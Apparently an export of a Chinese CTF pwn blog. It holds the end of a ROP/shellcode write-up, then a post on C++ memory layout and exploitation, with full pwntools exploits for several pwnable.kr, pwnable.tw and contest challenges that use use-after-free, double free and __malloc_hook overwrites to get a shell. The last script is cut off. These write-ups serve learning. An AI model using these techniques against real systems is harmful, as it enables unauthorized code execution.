;将字串中的SI指针所指的一个字节装答入AL 两条指令： 120x080485b6: popal; cld; ret; 0x08048436: add dword ptr [ebx + 0x453bfc45], ecx; adc byte ptr [esi - 0x70], bh; leave; ret; exp：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#coding:utf-8from pwn import *path = './xx_warm_up'P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'def hex2str(addr): addr = str(hex(addr))[2:].rjust(8,'0') return addrdef make_addr(addr): addr_str = hex2str(addr) i = 0 real_str = '' while i &lt; 8: real_str += addr_str[6-i] + addr_str[7-i] i += 2 return real_strdef str2num(string): length = len(string) i = 0 tmp = '' while i &lt; length: tmp += str(hex(ord(string[i])))[2:] i += 1 length = len(tmp) tmp= tmp.ljust(4*(length/4+1),'0') print tmp return tmp #0x08048618: pop ebx; pop esi; pop edi; pop ebp; ret; pop_4 = 0x08048618buf = 0x0804A040#0x0804840e: leave; ret;#0x08048516: pop ebx; pop esi; pop ebp; ret; #0x080485b6: popal; cld; ret; #0x08048436: add dword ptr [ebx + 0x453bfc45], ecx; adc byte ptr [esi - 0x70], bh; leave; ret;shellcode = '31c931d231c050682f736800682f62696e89e3b00bcd80'#shellcode = asm(shellcraft.i386.linux.sh())payload = make_addr(0x080483DB)+make_addr(0x08048516)payload+= make_addr(0x0804A800)+make_addr(buf+0x44)payload+= make_addr(4*5)payload+= make_addr(0x080485b6)payload+= make_addr(0) #edipayload+= make_addr(0x0804A700) #esipayload+= make_addr(0x0804A800-4) #ebppayload+= make_addr(0x0804A800) #esppayload+= make_addr(P.got['__libc_start_main']-0x453bfc45+0x100000000) #ebxpayload+= make_addr(0) #edxpayload+= make_addr(0xca860) #ecxpayload+= make_addr(0) #eaxpayload+= make_addr(0x08048436)payload = payload.ljust(0x80,'1')payload+= make_addr(buf+4)payload+= make_addr(P.plt['__libc_start_main'])+make_addr(0x0804a098)payload+= make_addr(0x0804A000)+make_addr(0x1000)+make_addr(7)payload+= shellcodeprint payload 方法三一个好用的库：binascii 12345678910&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; from binascii import *&gt;&gt;&gt; b2a_hex(p32(0x0804a080))'80a00408'&gt;&gt;&gt; b2a_hex('hello')'68656c6c6f'&gt;&gt;&gt; len(b2a_hex('hello'))10&gt;&gt;&gt; b2a_hex('\x05\x06')'0506' mprotect抬栈要比system低的多，x86下只有0x14。。。 12340x0804a058--------------------0x0804a06c 反弹shell，但是没有成功，因为这个东西调了两天。。。 之前做kidding的时候，就出现了本地可以接收到反弹的连接，但是交互失败，当时我以为是局域网都是这样的，因为打tw那边的服务器直接成功了，就没继续追究，但是我做这题的时候，又回去调了一下，我用两台服务器，一台部署命令socat tcp-l:10000,fork exec:./kidding,reuseaddr，一台打exp，发现和局域网一样，可以反连回来，但是交互失败。 虚拟机本地调了一下，发现了诡异的现象，开启了/bin/dash新进程，但是程序接收到SIGTERM信号，被终止了。。。所以交互失败，但是查了一波资料没什么结果。。。。 可以看到端口dup是成功的，fd[0]与fd[1]已经被重定向为socket。fd[3]与fd[4]应该是由socat操控的。 改用ctf-xinted部署后，局域网内可打通，可交互： 所以我猜是因为socat的问题。。。可能是本来程序的fd[0]与fd[1]是由socat来控制的，被我们重定向以后所以产生了异常被检测到，然后发出了SIGTERM信号？我也不清楚。。。 这题因为shellcode长度问题，没办法直接send过去shellcode，所以计划是分段传送，第二段再传开shell的payload，但是可以回连成功，交互一直失败，而且貌似没办法调试。。。因为参数是用argv传的，没有输入点，gdb.attach没法断下来，偶然成功过一次，发现dup是成功的，fd[5]为socket，fd[0]也成功被dup成了socket，但是貌似在read(socket,buf,0x100)的地方没有读进去。。。导致shellcode之后就崩了。。有机会再研究吧。。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++初识]]></title>
    <url>%2F2020%2F03%2F20%2FC%2B%2B%E5%88%9D%E8%AF%86%2F</url>
    <content type="text"><![CDATA[0x00.前言C++是一门面向对象的语言，即使不是学习pwn的需要，学习也是很有必要的，虽然我大一下选修了C++，但是现在都基本忘了，现在等于又复习了一遍，最开始调的时候真的难受。。。堆太过于混乱了。。。 C++的题我在比赛中还没正式遇到，如果不给源码的话，逆向首先是第一道大关卡。。。然后还要去找漏洞，C++的题漏洞有自己的特性，与C还是有一定差别的，但是也有披着C++皮的C的漏洞。 总之还是修行太浅了。。。菜是原罪。 0x01.前置知识string类调试测试结果如下： 环境为Ubuntu 16.04，Glibc 2.23 string类型变量占内存0x20字节。结构分为如下两种情况： 123456789101112131415strlen(data) &lt;= 15: p64(data_ptr) p64(size) p64(data) p64(data)strlen(data) &gt; 15: p64(data_ptr) --&gt; heap p64(size) --&gt; 数据实际size p64(capacity) --&gt; chunk实际size，不带chunk头 p64(残留data)申请的chunk由 0x1e,0x3c,0x78,0xf0,0x1e0.... 30,60,120,240,480....不断乘2 实际chunk大小 0x30,0x50,0x90,0x100,0x1f0.... size：当前字符串长度 capacity：最大容量 allocator：空间分配函数，当我们对一个string对象进行输入数据时，常常会见到这个函数。 一般string类型的变量在声明时会调用构造函数，对变量赋值时，才会真正地申请内存，当strlen(data)&lt;=15时，第一种情况，当strlen(data)&gt;15时，第二种情况，不过需要注意栈上的脏数据。数据输入完毕后，会将之前的chunk全部free掉，最后类中的ptr指向最大的那个chunk。 当函数通过传值方式传递类参数时，编译器会调用拷贝构造函数复制出一个临时变量对象，将这个临时变量对象传给函数，这样就不会影响到实际对象了。string类的拷贝构造函数形式为： 123456789101112String::String(const String &amp;other)&#123; int length = strlen(other.m_data); m_data = new char[length+1]; if (m_data == NULL) &#123; std::cout &lt;&lt; "申请内存失败！" &lt;&lt; std::endl; exit(1); &#125; strcpy(m_data,other.m_data);&#125; 可见，拷贝出的临时string对象会直接申请被拷贝对象的data大小的chunk，而不会再一个一个chunk尝试。 string类析构时将delete掉存放数据的chunk。 vector类容器类，在堆上动态申请内存。当容器满状态时，将释放旧内存块，申请新的更大的内存块。每次申请的内存大小为上一次的两倍。 vector类型变量占0x18字节，有三个成员变量。 _M_start：容器当前开始位置 _M_finish：容易当前结束位置 _M_end_of_storage：容器最后位置 if _M_finish == _M_end_of_storage：表示容器已满，并将旧的内存释放，并为vector申请一块新的更大的内存，为上一块的两倍大小。 一些成员函数： push_back：将元素添加到容器最后。 pop_back：将容器最后的元素弹出。 insert：插入元素到容器中第n个位置。 erase：移除容器中第n个元素。 需要注意的是在使用push_back时，如果元素类型为类时，将使用拷贝构造函数将对象的值复制过去，默认的拷贝构造函数使用的为浅拷贝，若类中含有指针，会出现实际对象中的指针和vector中指针指向同一个地址，析构时会产生double_free。 list类基本操作与vector类似，不过形式是一个双向链表，每push_back一个元素，head就会多链接一个成员，成员个数也会加一，成员结构的内存会在heap上申请，大小为0x10(两个指针) + 成员本体size。 1234567head结构: p64(fd指针)+p64(bk指针)p64(成员个数)成员结构：p64(fd指针)+p64(bk指针)p64(成员本体) 需要注意的是：若调用clear()函数清空list时，如果成员为类的实例，则会先调用类的析构函数来析构实例，再delete装有成员结构的内存，若不为类的实例（例如成员为指针或者整数啥的），则直接delete装有成员结构的内存。head里还会将成员个数的部位清零。所以若成员类型为指针，我们要记得自己先遍历list将每一个成员，将其全部都delete掉，再调用clear()清理成员结构内存，否则可能会导致内存泄露。 构造函数与析构函数构造函数(constructor)与析构函数(destructor)算是伴随着类产生的概念，为一个类实例化一个对象时，就会默认调用构造函数，在这个对象的寿命结束时，就会调用析构函数。 构造函数主要负责对类中成员变量的初始化，有虚函数的话，会先将第一个成员赋值为vfptr。若成员变量中含有指针的话，其中常常伴有new操作，需要格外注意。 析构函数主要负责对类中成员变量的清理。若成员变量中含有指针，其中常常伴有delete操作，需要格外注意。 当一个类是继承类的时候，构造会先调用父类的构造函数，再调用子类的构造函数，析构会先调用子类的析构函数，再调用父类的析构函数。 析构函数不能被重载，是惟一的。 调用析构的时机： 变量在离开作用域时被销毁 当一个对象被销毁时，其成员被销毁 容器被销毁时（标准库容器或数组），其元素被销毁 动态分配的对象，当对指向它的指针应用delete时被销毁 临时对象，当创建它的完整表达式结束时被销毁 虚表和虚函数C++类的内存分配与虚函数 C++类的虚函数与pwnable.kr_UAF vtable常见攻击) vtable通常位于不可写段，但是vfptr通常位于可写段，所以若是可以通过一些漏洞实现溢出，修改vfptr就可以劫持程序执行流了。 拷贝构造函数与拷贝赋值运算符定义一个类，会显式或隐式指定此类型的对象拷贝、移动、赋值和销毁时做什么。类通过定义五种特殊的成员函数来控制这些操作，包括：拷贝构造函数(copy constructor)、拷贝赋值运算符(copy-assignment operator)、移动构造函数(move constructor)、移动赋值运算符(move-assignment operator)和析构函数(destructor)。 其中拷贝构造和移动构造器定义了当用同类型的另一个对象初始化本对象时的行为。而拷贝赋值和移动赋值定义了将一个对象赋予同类型的另一个对象时的行为。析构函数定义了此类型对象销毁时做什么。这些统称为拷贝控制操作。 对于没有显式定义这些成员的，编译器会自动定义默认的版本。一些类必须要自己定义拷贝控制成员，另外一些则不需要。 拷贝初始化不仅在用=定义变量时发生，在下列情形也会发生： 将一个对象作为实参传递给一个非引用类型的形参 从一个返回类型为非引用类型的函数返回一个对象 用花括号列表初始化一个数组中的元素或一个聚合类中的成员 拷贝构造函数：12345class Foo&#123;public: Foo(); //默认构造函数 Foo(const Foo&amp;); //拷贝构造函数&#125; 拷贝赋值运算符：123456789101112class Foo&#123;public: Foo&amp; operator=(const Foo&amp;)&#123; //... return *this; &#125; 或 void operator=(const Foo&amp;)&#123; //... &#125; // ...&#125; 二者区别： 赋值运算符和复制构造函数都是用已存在的b对象来创建另一个对象a。不同之处在于：赋值运算符处理两个已有对象，即赋值前b应该是存在的；复制构造函数是生成一个全新的对象，即调用复制构造函数之前a不存在。 12CTemp a(b); //复制构造函数，C++风格的初始化CTemp a = b; //仍然是复制构造函数，不过这种风格只是为了与C兼容，与上面的效果一样 在这之前a不存在，或者说还未构造好。 12CTemp a;a = b; //赋值运算符 在这之前a已经通过默认构造函数构造完成。 REF：强烈推荐一 强烈推荐二 强烈推荐三 在gdb中可以用set print asm-demangle on命令让function好看一点。 建议初学者多看参考链接。。。很多东西我都懒得写了，就当是常识吧。 智能指针0x02.pwnable.kr_UAF思路：题目很简单，并且给了源码，UAF控制类的虚表。 但是当时我做的时候没看IDA，以为一个类需要申请0x30(vfptr(0x8)+age(0x8)+string(0x20))，但是一直报错，后来放到IDA中，发现只申请了0x18的chunk。。。后来发现构造函数是用字符串构造的，不是用string类构造的（是直接用Jack和Jill这两个常量字符串初始化的，所以实例化的对象中也只是一个字符串指针，所以为vfptr(0x8)+age(0x8)+char*(0x8)）。之后就是delete时需要先delete掉字符串指针，再delete掉实例。 exp：123456789101112131415161718192021222324252627282930313233343536#coding:utf-8from pwn import *path = './uaf'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(executable=path,argv=['./uaf','8','/dev/stdin']) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()p.recvuntil('3. free')p.sendline('3')p.recvuntil('3. free')p.sendline('2')p.send('\x00'*8)p.recvuntil('3. free')p.sendline('2')payload = p64(0x401568)p.send(payload)p.recvuntil('3. free')p.sendline('1')p.interactive() 0x03.2019*CTF_upxofcpp思路：这道题其实蛮有创意的一题，算是半个C++题吧，一是因为用C++写的，但实际的漏洞和C++关系不是很大。 主要在于知不知道upx后的程序的heap段是rwx的，知道了这一点就很简单了。 exp：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#coding:utf-8from pwn import *path = './upxofcpp_r'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(idx,size): p.recvuntil('Your choice:') p.sendline('1') p.recvuntil('Index:') p.sendline(str(idx)) p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('stop:')def delete(idx): p.recvuntil('Your choice:') p.sendline('2') p.recvuntil('index:') p.sendline(str(idx))shellcode = "\x31\xF6\x56\x48"shellcode+= "\xBB\x2F\x62\x69"shellcode+= "\x6E\x2F\x2F\x73"shellcode+= "\x68\x53\x54\x5F"shellcode+= "\xF7\xEE\xB0\x3B"shellcode+= "\x0F\x05"new(0,5)for i in range(4): p.sendline(str(0))p.sendline(str(0x38eb))new(1,28)p.sendline(str(0))p.sendline(str(0))p.sendline(str(0x4856F631))p.sendline(str(0x69622FBB))p.sendline(str(0x732F2F6E))p.sendline(str(0x5F545368))p.sendline(str(0x3BB0EEF7))p.sendline(str(0x50F))p.sendline('-1')new(2,8)p.sendline('-1')new(3,8)p.sendline('-1')delete(1)delete(2)delete(3)p.recvuntil('Your choice:')p.sendline('4')p.recvuntil('index:')p.sendline(str(3))if attach == 1: gdb.attach(p)p.interactive() 0x04.2019USTC_easycpp思路：先是一个简单的逆向，解出密码之后，是一个抄袭CAOV的题目。。。在细节上有一点不同，基本思想相同。 exp：123456789101112131415161718'''for (i = 0; i &lt;= 7; ++i) temp_password[i] = ((temp_password[i] | temp_password[i + 1]) &amp; ~(temp_password[i] &amp; temp_password[i + 1]) | i) &amp; ~((temp_password[i] | temp_password[i + 1]) &amp; ~(temp_password[i] &amp; temp_password[i + 1]) &amp; i); if(memcmp(temp_password, "\x44\x00\x02\x41\x43\x47\x10\x63\x00", 9)) &#123; cout &lt;&lt; "Bad guy! Wrong password!" &lt;&lt; endl; exit(0);'''a = '\x44\x00\x02\x41\x43\x47\x10\x63\x00'b = ['\x00','\x00','\x00','\x00','\x00','\x00','\x00','\x00','\x00']buf1 = 0for j in range(7,-1,-1): for buf in range(128): buf1 = ((buf | ord(b[j+1])) &amp; ~(buf &amp; ord(b[j+1])) | j) &amp; ~((buf | ord(b[j+1])) &amp; ~(buf &amp; ord(b[j+1])) &amp; j) if a[j] == chr(buf1): b[j] = chr(buf)print b 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#coding:utf-8from pwn import *path = './EasyCPP'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def edit(password,data): p.recvuntil('choice:') p.sendline('1') p.recvuntil('Your new password: \n') p.send(password) p.recvuntil('please:\n') p.send(data) p.recvline() p.sendline('0') p.recvline() p.sendline('0') p.recvline() p.sendline('0') p.recvline() p.sendline('0')p.recvuntil('Username:')p.sendline('admin')p.recvuntil('Password:')payload = 'p455w0rd'p.send(payload)password_addr = 0x6032E0payload = p64(0)+p64(0x71)payload = payload.ljust(0x70,'\x00')payload+= p64(0)+p64(0x21)payload+= p64(password_addr+0x10)data = '\x00'edit(payload,data)payload = p64(0)+p64(0x71)+p64(0x603285)data = p64(0)+p64(0x71)data = data.ljust(0x60,'\x11')edit(payload,data)payload = p64(0)+p64(0x71)+p64(0)data = '\x00'*0xb+p64(password_addr)data = data.ljust(0x60-0x15,'\x00')data+= p64(0x603280)data = data.ljust(0x60,'\x00')edit(payload,data)payload = p64(0x603280)+p64(0x71)p.recvuntil('choice:')p.sendline('1')p.recvuntil('Your new password: \n')p.send(payload)p.recvuntil('STUDENT: ')libcbase = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['_IO_2_1_stderr_']log.success('libcbase = '+hex(libcbase))p.recvuntil('please:\n')p.send('\x00')p.recvline()p.sendline('0')p.recvline()p.sendline('0')p.recvline()p.sendline('0')p.recvline()p.sendline('0')payload = p64(password_addr)+p64(0x71)payload = payload.ljust(0x70,'\x00')payload+= p64(0)+p64(0x21)payload+= p64(password_addr+0x10)data = '\x00'edit(payload,data)payload = p64(password_addr)+p64(0x71)payload+= p64(libcbase+libc.sym['__malloc_hook']-0x23)data = '\x33'*0x60edit(payload,data)one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]payload = p64(password_addr+0x10)data = '\x00'*0x13+p64(libcbase+one_gadget[2])data = data.ljust(0x60,'\x01')edit(payload,data)p.recvuntil('choice:')p.sendline('1')p.recvuntil('Your new password: \n')p.send(p64(password_addr+0x10))if attach == 1: gdb.attach(p)p.interactive() 0x05.pwnable.tw_CAOV思路：CAOV(Copy_Assignment_Operator_Vulnerability)，拷贝赋值运算符漏洞。 源码中下面这部分代码出现了问题： 12345678910111213Data operator=(const Data &amp;rhs)&#123; key = new char[strlen(rhs.key)+1]; strcpy(key, rhs.key); value = rhs.value; change_count = rhs.change_count; year = rhs.year; month = rhs.month; day = rhs.day; hour = rhs.hour; min = rhs.min; sec = rhs.sec;&#125; 复制运算符重载时返回值类型要为Data&amp;，不然只会返回临时变量，而这一题中连返回值都没有，所以编译器会直接创建一个临时对象（作为返回值），然后析构，造成了任意地址delete的漏洞。 如果要防止这个漏洞的话，可以将返回值改为void，或者将返回值改为Data&amp;并在最后加上return *this。 放到IDA里看就会发现，在edit函数中，有一个未初始化的临时Data类变量被析构了，再结合main函数里，set_name和edit共用同一个栈，可以利用set_name控制栈中的数据，达到任意地址delete的效果。我们可以用bss上的name缓冲区伪造chunk，与留在bss段的stderr，stdout合作，进行结构体伪造和libcbase泄露，然后UAF劫持malloc_hook exp：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#coding:utf-8from pwn import *path = './caov'local = 0attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote("chall.pwnable.tw",10306) libc = ELF('./libc_64.so.6')def show(): p.recvuntil('Your choice: ') p.sendline('1')def edit(name,new_len,key,value): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Enter your name: ') p.sendline(name) p.recvuntil('New key length: ') p.sendline(str(new_len)) p.recvuntil('Key: ') p.sendline(key) p.recvuntil('Value: ') p.sendline(str(value))def init(name,key,value): p.recvuntil('Enter your name: ') p.sendline(name) p.recvuntil('Please input a key: ') p.sendline(key) p.recvuntil('Please input a value: ') p.sendline(str(value))name_addr = 0x6032c0init('xxrw','xxrw',521)name = p64(0)+p64(0x71)name = name.ljust(0x60,'\x00')name+= p64(name_addr+0x10)+p64(0)name+= p64(0)+p64(0x21)edit(name,4,'xxrw',521)name = p64(0)+p64(0x71)+p64(0x603285)edit(name,0x60,'',521)name = p64(0x603280)key = 'a'*0xb+p64(name_addr)edit(name,0x60,key,521)p.recvuntil('Key: ')p.recvuntil('Key: ')libcbase = u64(p.recv(6).ljust(8,'\x00'))-libc.sym['_IO_2_1_stderr_']log.success('libcbase = '+hex(libcbase))name = p64(0x603338)+p64(0x71)name = name.ljust(0x60,'\x00')name+= p64(name_addr+0x10)+p64(0)name+= p64(0)+p64(0x21)edit(name,1,'\x21',521)name = p64(0x603338)+p64(0x71)name+= p64(libcbase+libc.sym['__malloc_hook']-0x23)edit(name,0x60,p64(0),521)name = p64(0x603338)if local == 1: one_gadget = [0x45216,0x4526a,0xf1147,0xf02a4] key = '\x00'*0x13+p64(libcbase+one_gadget[3])else: one_gadget = [0x45216,0x4526a,0xef6c4,0xf0567] key = '\x00'*0x13+p64(libcbase+one_gadget[2])edit(name,0x60,key,521)p.interactive() REF：https://zhidao.baidu.com/question/1733410694674894467.html 0x06.pwnable.tw_GhostParty思路：考点为Shallow copy(浅拷贝)，默认的复制构造函数就使用的是浅拷贝。 感觉我的方法还是比较简便的，我只用到了Vampire类，在small_list里的choice3中，给speaking函数传参时，因为通过传参方式为传值，所以会新建一个临时变量，通过默认拷贝构造函数将原对象内容拷贝过去，因为默认的拷贝构造函数为浅拷贝，所以临时对象与实际对象的blood指针指向同一个地址，但是在销毁临时对象时会delete其blood指针，可以通过这个UAF来泄露libcbase，然后在rm的时候，调用析构函数销毁实际对象时，会再delete一次blood指针，double_free劫持malloc_hook，get shell! ! ! :). exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#coding:utf-8from pwn import *path = './test/demo1'local = 0attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote("chall.pwnable.tw",10401) libc = ELF('./libc_64.so.6')def add_ghost(name,age,message,blood,choice,default_type=7): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Name : ') p.sendline(name) p.recvuntil('Age : ') p.sendline(str(age)) p.recvuntil('Message : ') p.sendline(message) p.recvuntil('Choose a type of ghost :') p.sendline(str(default_type)) p.recvuntil('Add blood :') p.sendline(blood) p.recvuntil('Your choice : ') p.sendline(str(choice))def show(index): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil(' show in the party : ') p.sendline(str(index))def delete(index): p.recvuntil('Your choice :') p.sendline('4') p.recvuntil('the party : ') p.sendline(str(index))add_ghost('\x01'*0x100,20,'xxrw','\x01'*0x80,3) #0 show(0)p.recvuntil('Blood : ')if local == 1: libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fbeaa5efb78-0x00007fbeaa22b000) log.success('libcbase = '+hex(libcbase))else: libcbase = u64(p.recv(6).ljust(8,'\x00')) - 0x58 - 0x3C3B20 log.success('libcbase = '+hex(libcbase))add_ghost('\x11'*0x60,20,'xxrw','\x11'*0x60,1) #1add_ghost('\x12'*0x60,20,'xxrw','\x12'*0x60,3) #2delete(2) #double_freeadd_ghost(p64(libcbase+libc.sym['__malloc_hook']-0x23).ljust(0x60,'\x12'),20,'xxrw','\x12'*0x60,1) #2one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]payload = '\x00'*0xb+p64(libcbase+one_gadget[1])+p64(libcbase+libc.sym['__libc_realloc']+6)add_ghost('\x00',20,'xxrw',payload.ljust(0x60,'\x00'),1)p.recvuntil('Your choice :')p.sendline('1')p.recvuntil('Name : ')p.sendline('\x00'*0x10)p.interactive() 0x07.2019ByteCTF线下_pwn1漏洞分析：没给源码的C++题逆向真的逆的头皮发麻。。。有时间得学一学逆向和算法。。。 题目应该是有四个洞(我找到的)，其中一个是栈溢出，应该是用来热身用的。还有一个堆溢出是在EProduct的虚表里的第一个函数中，若num大于2的时候，会产生堆溢出，但是逻辑上貌似利用不了？因为在运行到这个函数之前，那一块内存已经被初始化为了0，中间貌似没有什么可以劫持的地方。。。 另外一个洞是Kitchen的虚表中的第一个函数里会把临时变量的指针取出来保存到结构体中，但是在最后会把临时变量析构，配合show功能，会有一个UAF的读取。 最后一个洞是看了眼流量才找到的。。。当时猜就是逻辑的洞，果然没错。在Snack中的数组越界，Snack类虚表的第二个函数中，rm kind时会将finish指针减8，但是没有进行检测，所以可以在堆上underflow，配合add kind，可以进行堆上的越界写。从而篡改虚表指针或者一些重要位置的数据。 所以最后的exp可以写出至少两份，写好后看了下当时流量打过来的exp，感觉好像和我不同，它好像没用到我找到的第三个洞，不过我照他的写会报错。。。 myexp1：12345678910111213141516171819202122232425262728293031323334353637383940414243444546#coding:utf-8from pwn import *path = './pwn'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def show(name): p.recvuntil('Input number: ') p.sendline('1') p.recvuntil('Please input your name first: ') p.sendline(name)show('\x11'*0x68+'\x22')p.recvuntil('\x22')canary = u64(p.recv(7).ljust(8,'\x00'))canary = canary &lt;&lt; 8log.success('canary = '+hex(canary))show('\x11'*0x58)p.recvuntil('\x11'*0x58)libcbase = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['_IO_file_underflow'] - 328log.success('libcbase = '+hex(libcbase))payload = '\x11'*(0x68+0xa0) + p64(canary) payload+= p64(0)*3 + p64(0x404023)payload+= p64(libc.search('/bin/sh').next()+libcbase)payload+= p64(libc.sym['system']+libcbase)show(payload)if attach == 1: gdb.attach(p)p.interactive() myexp2：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#coding:utf-8from pwn import *path = './pwn'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def show(name): p.recvuntil('Input number: ') p.sendline('1') p.recvuntil('Please input your name first: ') p.sendline(name)def new_EProduct(name,num): p.recvuntil('Input number: ') p.sendline('2') p.recvuntil('number: ') p.sendline('1') p.recvuntil('Name: ') p.sendline(name) p.recvuntil('number: ') p.sendline(str(num))def new_Snack(name,num): p.recvuntil('Input number: ') p.sendline('2') p.recvuntil('number: ') p.sendline('3') p.recvuntil('Name: ') p.sendline(name) p.recvuntil('number: ') p.sendline(str(num)) def new_Exist(num): p.recvuntil('Input number: ') p.sendline('2') p.recvuntil('number: ') p.sendline('5') p.recvuntil('number: ') p.sendline(str(num)) def new_Kitchen(name,num): p.recvuntil('Input number: ') p.sendline('2') p.recvuntil('number: ') p.sendline('4') p.recvuntil('Name: ') p.sendline(name) p.recvuntil('number: ') p.sendline(str(num)) def add_Snack(num): p.recvuntil('number: ') p.sendline('1') p.recvuntil('number: ') p.sendline(str(num))def delete_Snack(): p.recvuntil('number: ') p.sendline('2')def enter(num): p.recvuntil('Input number: ') p.sendline('3') p.recvuntil('number: ') p.sendline(str(num))def exit(): p.recvuntil('number: ') p.sendline('4')def delete(num): p.recvuntil('number: ') p.sendline('4') p.recvuntil('number: ') p.sendline(str(num)) new_Kitchen('\x11'*0x78,0xdeadbeef)new_Snack('\x33'*4,0xdeadbeef)show('xxrw')p.recvuntil('Name: ')heapbase = u64(p.recvuntil(', ',drop=True).ljust(8,'\x00')) - (0x134b040-0x1338000)log.success('heapbase = '+hex(heapbase))enter(1)add_Snack(0xdeadbeef)for i in range(3): delete_Snack()add_Snack(heapbase+(0x25dc088-0x25c9000))exit()show('xxrw')p.recvuntil('Name: ')libcbase = u64(p.recvuntil(', ',drop=True).ljust(8,'\x00')) - (0x7f4f30459b78-0x7f4f30095000)log.success('libcbase = '+hex(libcbase))enter(1)add_Snack(0xdeadbeef)for i in range(8): delete_Snack()add_Snack(heapbase+(0x14ed038-0x14da000))'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL'''one_gadget = [0x45216,0x4526a,0xf1147,0xf02a4]add_Snack(libcbase+one_gadget[3])exit()show('\x00'*8)if attach == 1: gdb.attach(p)p.interactive() 反思：这题比较有意思的地方就是add kind和rm kind模拟了vector的push_back和pop_back，但是自定义的功能中没有越界检测。。。之前对vector研究时没注意到过这里，算是补上了。 最后比较幸运的是有个one_gadget正好撞到name的位置，所以正好填充\x00，不过用gadget微调应该也是可以的。 0x08.2019ByteCTF线下_pwn2同样是没给源码的C++题，此题环境为2.27，是个多线程题目。逆向依然逆的头皮发麻。。。 0x09.2020i春秋新春公益_DragonQuest思路：果然做一些脑洞比较大的题还是和别人讨论比较好，开始一直卡在怎么杀死Dragon。。。后来被大佬提醒训练时可以一直6，5循环来以指数形式增长攻击力，杀死龙以后，比的就是利用的技巧和对c++各种数据类型的内存分配的熟悉程度了。 exp：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#coding:utf-8from pwn import *path = './pwn'local = 0attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('123.56.85.29',4978) libc = ELF('./libc')def give_up(len,name): p.recvuntil('choose:') p.sendline('1') p.recvuntil('choose:') p.sendline('3') p.recvuntil('length:') p.sendline(str(len)) p.recvuntil('name:') p.send(name) p.recvuntil('choose:')p.sendline('1')for i in range(24): p.recvuntil('choose:') p.sendline('1') p.recvuntil('7. Give up') p.sendline('6') p.recvuntil('7. Give up') p.sendline('5')p.recvuntil('choose:')p.sendline('2')p.recvuntil('Give up')p.sendline('2')p.recvuntil('how long your name:')p.sendline(str(0x90))sleep(1)p.send('\x11'*0x90)p.recvuntil('choose:')p.sendline('3')p.recvuntil('name : ')libcbase = u64(p.recv(6).ljust(8,'\x00')) - 